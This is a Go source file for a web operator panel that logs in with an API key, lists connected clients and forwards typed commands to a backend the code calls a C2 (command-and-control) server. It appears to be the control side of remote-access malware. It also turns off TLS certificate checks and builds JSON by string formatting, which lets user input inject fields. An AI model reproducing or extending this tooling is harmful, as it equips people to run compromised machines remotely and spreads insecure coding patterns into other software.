package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/labstack/echo/v4"
)

type cmdForm struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

var api_key string = ""
var c2_address string = "https://localhost:443"

func sendCommandToC2(c echo.Context) error {
	cmdJson := cmdForm{}
	fmt.Println(c.Request().Body)
	/*
		in := bufio.NewReader(os.Stdin)
		text, err := in.ReadString('\n')
		command := strings.Replace(text, " ", "+", -1)
		command = command[:len(command)-2]
	*/

	err := json.NewDecoder(c.Request().Body).Decode(&cmdJson)
	if err != nil {
		fmt.Printf(err.Error())
	}

	//jsonStr, err := json.Marshal(c.Request().Body)
	//fmt.Println(string(jsonStr))
	fmt.Printf("\n")

	fmt.Printf(cmdJson.Cmd)
	link := "https://" + "localhost:443" + "/getCommand"
	fmt.Printf(link)

	body := fmt.Sprintf(`
	{
		"id":"%s",
		"cmd":"%s"
	}
	`, cmdJson.ID, cmdJson.Cmd)
	fmt.Printf(body)
	r, err := http.NewRequest("POST", link, bytes.NewBufferString(body))
	if err != nil {
		panic(err)
	}
	r.Header.Add("Content-Type", "application/json")
	r.Header.Set("auth-key", api_key)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	response, err := client.Do(r)
	if err != nil {
		panic(err)
	}

	defer response.Body.Close()

	content, _ := ioutil.ReadAll(response.Body)
	fmt.Printf(string(content))
	return c.String(http.StatusOK, string(content))
}

func main() {
	e := echo.New()

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	e.Static("/", "static/")
	/*
		e.Use(middleware.StaticWithConfig(middleware.StaticConfig{
			Root:       "static/",
			Browse:     false,
			IgnoreBase: true,
		}))*/

	/*e.Use(middleware.KeyAuth(func(key string, c echo.Context) (bool, error) {
		return key == "123", nil
	}))*/

	e.GET("/ready", func(c echo.Context) error {
		link := "https://localhost:443/sendClientsTable"
		client := &http.Client{Transport: tr}
		req, _ := http.NewRequest("GET", link, nil)
		req.Header.Set("auth-key", api_key)
		response, err := client.Do(req)

		if err != nil {
			fmt.Println(err)
		}
		defer response.Body.Close()

		content, _ := ioutil.ReadAll(response.Body)
		/*s := strings.TrimSpace(string(content))
		fmt.Printf(s)*/

		return c.HTML(http.StatusOK, string(content))
	})
	e.GET("/", func(c echo.Context) error {
		return c.File("static/login.html")
	})
	e.GET("/dashboard", func(c echo.Context) error {
		return c.File("static/dashboard.html")
	})
	e.GET("/remote", func(c echo.Context) error {
		uid := c.QueryParam("uid")
		link := fmt.Sprintf("https://localhost:443/checkUser/%s", uid)
		fmt.Printf(uid)
		client := &http.Client{Transport: tr}

		req, _ := http.NewRequest("GET", link, nil)
		req.Header.Set("auth-key", api_key)
		response, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
		}
		defer response.Body.Close()

		content, _ := ioutil.ReadAll(response.Body)
		fmt.Printf(string(content))

		if string(content) == "Ok" {
			return c.File("static/term.html")
		} else {
			return c.String(http.StatusBadRequest, "Incorrect id")
		}
	})
	e.POST("/login", func(c echo.Context) error {
		//usr := c.FormValue("Username")
		key := c.FormValue("Key")

		api_key = key

		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr}

		req, _ := http.NewRequest("GET", c2_address+"/checkKey", nil)
		req.Header.Set("auth-key", api_key)
		res, _ := client.Do(req)
		if res.StatusCode == 401 || res.StatusCode == 400 {
			return c.String(http.StatusBadRequest, "Invalid key")
		}
		return c.Redirect(http.StatusMovedPermanently, "/dashboard")

	})
	e.POST("/sendCmd", sendCommandToC2)
	e.Logger.Fatal(e.StartTLS(":7777", "../cert.pem", "../key.pem"))
}
